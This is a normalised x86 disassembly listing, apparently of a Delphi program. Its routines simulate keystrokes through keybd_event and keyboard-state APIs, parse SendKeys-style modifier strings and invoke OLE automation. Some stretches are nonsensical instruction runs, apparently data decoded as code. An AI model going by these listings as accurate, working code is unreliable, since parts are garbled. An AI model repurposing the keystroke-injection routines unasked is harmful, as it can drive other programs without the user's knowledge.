add ebx [ eax + 0x63 ]
lodsb [ esi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
xor [ edi - 0x54 ] ch
add esp esp
cmp ch [ eax - 0x5340fffd ]
add ecx eax
pop ebx
lodsb [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax + 0x6403ab7d ]
imul ebp [ ebx + eax + sub_3ab7a0c ] 0xffffffa8
jmp r-xdata
cmpsb [ esi ] [ edi ]
add eax eax
pop edi
lodsb [ esi ]
add ebx [ eax - 0x73fc5478 ]
lodsb [ esi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edi [ eax + 0x1c03ac61 ]
bound ebp [ ebx + eax + sub_3ac6358 ]
jo r-xdata
inc ebx
sub_3af0681
push es
scasd [ edi ]
add ecx [ edx + eax * 2 ]
jne r-xdata
add [ ebx - 0xf6d00f0 ] cl
add [ eax ] al
add [ edx + r-xdata ] bh
je r-xdata
pushad
add eax [ eax ]
outsb
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x7b40013
scasd [ edi ]
add ecx [ edx + eax * 2 ]
jne r-xdata
add al ch
scasd [ edi ]
je r-xdata
add [ ebx ] 0x0
outsb
xor al [ ebx + 0x6c ]
imul esp [ ebx + 0x6b ] 0x7f40013
scasd [ edi ]
add ecx [ edx + eax * 2 ]
jne r-xdata
dec edi
jo r-xdata
je r-xdata
call 0xffffffffebaf0792
xchg ecx eax
loop r-xdata
outsb
inc ebx
push 0x3e7c7461
add [ esp + edi * 2 ] bh
outsb
xor eax [ ebx + 0x6c ]
imul esp [ ebx + 0x6b ] 0x6f465406
jb r-xdata
push 0x3e8
call Sleep
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af07b0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
jl r-xdata
xor al 0x5
add al cl
xor al 0xa9
add eax [ edx + ebp * 4 ]
test eax 0xa9441c03
add ebp esp
shr [ ecx - 0x52bb63fd ] 0x1
add ebx eax
push es
scasd [ edi ]
add eax [ edi ]
push es
push esp
inc esi
outsd
jb r-xdata
add ecx [ ebx + 0x70808b00 ]
add eax [ eax ]
add [ ebx ] dh
shr al cl
sub ah bl
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3af07a9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0x0
mov eax [ ebx + 0x380 ]
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x4 ]
call sub_3a69958
mov ecx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
xor ecx ecx
mov edx 0x6
mov eax [ eax + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax [ ebx + 0x380 ]
call sub_3ae35c4
pop ebx
retn
xor al 0xe8
add al 0xaf
add ebp [ ebx + ebp - 0x54 ]
add ebp [ eax ]
add al 0x43
push 0x7461
lea eax [ eax ]
push ebx
mov ebx eax
mov eax [ ebx + 0x360 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
mov edx r-xdata
sub_3af07f2
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3af092e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x374 ]
add eax 0x68
mov edx r-xdata
call sub_3a652f4
lea edx [ ebp - 0xc ]
xor eax eax
call sub_3a63350
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
call sub_3a69fb0
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x374 ]
call sub_3a9fbd8
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acedfc
push [ ebp - 0x10 ]
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_3aafb88
push [ ebp - 0x14 ]
mov eax [ ebx + 0x374 ]
add eax 0x78
mov edx 0x3
call sub_3a65634
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_3aafb88
mov edx [ ebp - 0x18 ]
mov eax [ ebx + 0x374 ]
add eax 0x80
mov ecx r-xdata
call sub_3a655b8
mov eax [ ebx + 0x374 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af0935
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x374 ]
call sub_3a9fb6c
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_3a6a01c
mov eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_3a656c8
je r-xdata
mov eax [ ebx + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a6556c
sub_3af098c
push ebp
mov ebp esp
add esp 0xffffffe4
push 0x0
push ecx
push edx
push eax
call keybd_event
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
jmp r-xdata
push 0x1
push 0x109
push 0x100
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call TranslateMessage
lea eax [ ebp - 0x1c ]
push eax
call DispatchMessageA
sub_3af09d8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp bl 0x90
jne r-xdata
push 0x0
movzx eax bl
push eax
call MapVirtualKeyA
and al 0xff
mov [ ebp - 0x2 ] al
test si si
jbe r-xdata
push 0x90
call GetKeyState
and ax 0x1
cmp al 0x1
sbb ebx ebx
inc ebx
lea eax [ ebp - 0x102 ]
push eax
call GetKeyboardState
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
movzx eax al
bt [ rw-data ] eax
jae r-xdata
or [ ebp - 0x72 ] 0x1
and [ ebp - 0x72 ] 0xfe
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
xor ecx ecx
movzx edx [ ebp - 0x2 ]
mov eax ebx
call sub_3af098c
pop ecx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx 0x1
movzx edx [ ebp - 0x2 ]
mov eax ebx
call sub_3af098c
pop ecx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
lea eax [ ebp - 0x102 ]
push eax
call SetKeyboardState
jmp r-xdata
dec si
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx 0x2
movzx edx [ ebp - 0x2 ]
mov eax ebx
call sub_3af098c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx 0x3
movzx edx [ ebp - 0x2 ]
mov eax ebx
call sub_3af098c
pop ecx
jmp r-xdata
sub_3af0abc
push ebp
mov ebp esp
push ebx
mov ebx eax
push 0x0
movzx eax bl
push eax
call MapVirtualKeyA
and al 0xff
mov edx ebx
movzx edx dl
bt [ rw-data ] edx
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_3af098c
pop ecx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
xor ecx ecx
mov edx eax
mov eax ebx
call sub_3af098c
pop ecx
pop ebx
pop ebp
retn
sub_3af0b08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx esi
shr bx 0x8
mov eax ebx
mov dl 0x1
call sub_3af0980
test al al
je r-xdata
mov eax ebx
mov dl 0x2
call sub_3af0980
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
xor ecx ecx
mov dx 0x1
mov al 0x10
call sub_3af09d8
pop ecx
mov eax ebx
mov dl 0x4
call sub_3af0980
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
xor ecx ecx
mov dx 0x1
mov al 0x11
call sub_3af09d8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
and al 0xff
movzx ecx [ ebp - 0x1 ]
mov edx edi
call sub_3af09d8
pop ecx
mov eax ebx
mov dl 0x1
call sub_3af0980
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
xor ecx ecx
mov dx 0x1
mov al 0x12
call sub_3af09d8
pop ecx
mov eax ebx
mov dl 0x2
call sub_3af0980
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov al 0x10
call sub_3af0abc
pop ecx
mov eax ebx
mov dl 0x4
call sub_3af0980
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov al 0x11
call sub_3af0abc
pop ecx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
mov al 0x12
call sub_3af0abc
pop ecx
sub_3af0be0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x104 ]
movzx ecx [ esi ]
inc ecx
[ edi ] [ esi ]
mov si 0xffff
mov [ ebp - 0x3 ] 0x1
mov [ ebp - 0x4 ] 0x29
mov [ ebp - 0x1 ] 0x0
movzx ebx [ ebp - 0x3 ]
movzx eax [ ebp - 0x4 ]
add ebx eax
shr ebx 0x1
mov al 0x1
cmp bl [ ebp - 0x4 ]
je r-xdata
lea eax [ ebp - 0x104 ]
movzx edx bl
mov ecx edx
shl edx 0x8
add edx ecx
add edx rw-data
call sub_3a63950
jbe r-xdata
mov [ ebp - 0x1 ] 0x1
movzx esi [ edi + rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] bl
jmp r-xdata
movzx eax [ ebp - 0x1 ]
or al [ ebp - 0x2 ]
je r-xdata
mov [ ebp - 0x2 ] al
lea eax [ ebp - 0x104 ]
movzx edx bl
mov edi edx
shl edi 0x8
add edi edx
lea edx [ edi + rw-data ]
movzx ecx [ eax ]
inc ecx
call sub_3a639d4
jne r-xdata
adc ebx 0x0
movzx ebx [ ebp - 0x3 ]
movzx eax [ ebp - 0x4 ]
add ebx eax
inc ebx
sar ebx 0x1
jns r-xdata
cmp bl [ ebp - 0x3 ]
je r-xdata
cmp si 0xffff
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax r-xdata
call sub_3af097c
sub_3af0ccc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov al 0x10
call sub_3af0abc
pop ecx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov al 0x11
call sub_3af0abc
pop ecx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x3 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x5 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov al 0x12
call sub_3af0abc
pop ecx
sub_3af0d30
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_3af1037
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ rw-data ] 0x7fffffff
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2 ] 0x0
mov [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x5 ] 0x0
xor ebx ebx
mov eax esi
call sub_3a6a120
mov edi eax
cmp edi [ rw-data ]
jle r-xdata
test edi edi
je r-xdata
mov edi [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af103e
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_3a652c4
retn
cmp edi ebx
jle r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
call sub_3af0ccc
pop ecx
movzx eax [ esi + ebx ]
cmp eax 0x2b
jg r-xdata
sub eax 0x5e
je r-xdata
je r-xdata
mov [ ebp - 0x4 ] 0x1
push ebp
xor ecx ecx
mov dx 0x1
mov al 0x11
call sub_3af09d8
pop ecx
inc ebx
jmp r-xdata
sub eax 0x1d
je r-xdata
mov [ ebp - 0x3 ] 0x1
push ebp
xor ecx ecx
mov dx 0x1
mov al 0x10
call sub_3af09d8
pop ecx
inc ebx
jmp r-xdata
sub eax 0x25
je r-xdata
cmp edi ebx
jg r-xdata
mov [ ebp - 0xe ] 0x1
cmp [ esi + ebx + 0x1 ] 0x7b
jne r-xdata
sub eax 0x3
je r-xdata
mov [ ebp - 0x5 ] 0x1
push ebp
xor ecx ecx
mov dx 0x1
mov al 0x12
call sub_3af09d8
pop ecx
inc ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov [ ebp - 0x23 ] 0x0
mov [ ebp - 0xa ] 0x0
cmp edi ebx
jl r-xdata
mov [ ebp - 0x8 ] 0xdb
lea eax [ ebp - 0x7 ]
mov dl 0x1
call sub_3af0988
push ebp
mov cl 0x1
mov dx 0x1
movzx eax [ ebp - 0x8 ]
call sub_3af0b08
pop ecx
push ebp
call sub_3af0ccc
pop ecx
add ebx 0x3
jmp r-xdata
push ebp
mov cl 0x1
mov dx 0x1
mov al 0xd
call sub_3af09d8
pop ecx
push ebp
call sub_3af0ccc
pop ecx
inc ebx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
inc ebx
jmp r-xdata
dec eax
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
inc ebx
cmp [ esi + ebx ] 0x7d
jne r-xdata
movzx eax [ esi + ebx ]
push eax
call VkKeyScanA
mov [ ebp - 0x8 ] ax
cmp [ ebp - 0x8 ] 0xffff
je r-xdata
mov [ ebp - 0x2 ] 0x0
push ebp
call sub_3af0ccc
pop ecx
inc ebx
jmp r-xdata
jmp r-xdata
cmp [ esi + ebx ] 0x7d
jne r-xdata
mov eax r-xdata
call sub_3af097c
jmp r-xdata
movzx eax [ esi + ebx ]
call sub_3a633f4
mov edx eax
lea eax [ ebp - 0x28 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x23 ]
mov cl 0x14
call sub_3a63904
cmp edi ebx
jge r-xdata
mov [ ebp - 0xa ] 0x1
inc ebx
jmp r-xdata
mov eax r-xdata
call sub_3af097c
push ebp
mov cl 0x1
mov dx 0x1
movzx eax [ ebp - 0x8 ]
call sub_3af0b08
pop ecx
push ebp
call sub_3af0ccc
pop ecx
jmp r-xdata
lea eax [ ebp - 0x2c ]
lea edx [ ebp - 0x23 ]
call sub_3a65504
mov edx [ ebp - 0x2c ]
mov eax r-xdata
call sub_3a6587c
mov [ ebp - 0xb ] al
cmp [ ebp - 0xb ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0xdd
lea eax [ ebp - 0x7 ]
mov dl 0x1
call sub_3af0988
push ebp
mov cl 0x1
mov dx 0x1
movzx eax [ ebp - 0x8 ]
call sub_3af0b08
pop ecx
push ebp
call sub_3af0ccc
pop ecx
inc ebx
jmp r-xdata
inc ebx
cmp [ ebp - 0x23 ] 0x1
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
movzx ecx [ ebp - 0x23 ]
movzx eax [ ebp - 0xb ]
sub ecx eax
movzx edx [ ebp - 0xb ]
inc edx
lea eax [ ebp - 0x23 ]
call sub_3a63078
lea edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
call sub_3a65504
mov eax [ ebp - 0x30 ]
call sub_3a699d8
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x48 ]
push eax
movzx ecx [ ebp - 0xb ]
dec ecx
mov edx 0x1
lea eax [ ebp - 0x23 ]
call sub_3a63078
lea edx [ ebp - 0x48 ]
lea eax [ ebp - 0x23 ]
mov cl 0x14
call sub_3a63934
lea eax [ ebp - 0x23 ]
call sub_3af0be0
mov [ ebp - 0x8 ] ax
movzx eax [ ebp - 0x22 ]
push eax
call VkKeyScanA
mov [ ebp - 0x8 ] ax
jmp r-xdata
push ebp
mov cl 0x1
movzx edx [ ebp - 0xe ]
movzx eax [ ebp - 0x8 ]
call sub_3af0b08
pop ecx
push ebp
call sub_3af0ccc
pop ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0xffff
je r-xdata
sub_3af1200
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_3a652f4
mov eax [ ebx ]
call sub_3a69f28
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_3a65560
test eax eax
jle r-xdata
pop esi
pop ebx
retn
movzx eax [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_3a65730
mov edx esi
sub edx eax
mov eax ebx
call sub_3a659c0
mov eax [ ebx ]
call sub_3a69f28
mov esi eax
sub al 0xd
je r-xdata
sub_3af1250
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_3af12fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_3a65338
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_3a6d4a4
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af1301
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3a6cae0
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
call sub_3a6a864
sub_3af1301
mov eax ebx
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3af1324
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_3af1396
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3af1200
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_3af1250
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_3a652f4
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af139d
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
add esp 0xfffffff0
call sub_3a646e4
sub_3af139d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3af13e8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_3af14ea
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3af15dc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_3a65528
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_3a65528
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_3a65528
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3af1324
jmp sub_3a64c34
lea eax [ ebp - 0x8 ]
call sub_3a65a7c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_3a65a7c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_3a65a7c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_3af15ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af15e3
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_3a652c4
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_3a65a94
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
sub_3af15ec
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x28 ] ecx
mov esi edx
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_3a65d1c
xor eax eax
push ebp
push sub_3af1917
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x30 ] eax
xor ecx ecx
push ebp
push sub_3af18f4
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x4
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] edi
movzx eax [ esi + 0x2 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
movzx eax [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x38 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0x2c ] 0x48
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x38 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x50 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x4c ] 0x4
inc [ ebp - 0x44 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x30 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x3c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x30 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x20 ]
call sub_3af1bc4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x2c ] 0xc
jne r-xdata
cmp [ ebp - 0x2c ] 0xc
jne r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
call sub_3a661b0
mov edx [ ebp - 0x3c ]
mov [ edx ] eax
mov eax [ ebp - 0x3c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x3c ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_3a661b0
mov edx [ ebp - 0x3c ]
mov [ edx ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x3c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x38 ] 0x10
movzx eax [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
movzx edx dl
mov [ ebp - 0x2c ] edx
and al 0x80
cmp [ ebp - 0x2c ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af18fb
mov ebx [ ebp - 0x30 ]
test ebx ebx
je r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x250 ]
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x38 ]
mov edx [ ebp - 0x2c ]
mov [ eax ] edx
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0x2c ] 0x5
jl r-xdata
mov eax [ ebp - 0x34 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0x2c ]
or eax 0x4000
mov edx [ ebp - 0x38 ]
mov [ edx ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x34 ] 0x4
inc [ ebp - 0x30 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov edx edi
mov eax [ esi ]
call sub_3a6618c
cmp [ ebp - 0x2c ] 0x7
jg r-xdata
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x34 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x30 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax + 0x8 ]
call sub_3a661b0
mov edx [ ebp - 0x40 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x40 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov ecx 0x8
call sub_3a7124c
add [ ebp - 0x34 ] 0x4
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0xc ] eax
sub_3af1928
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
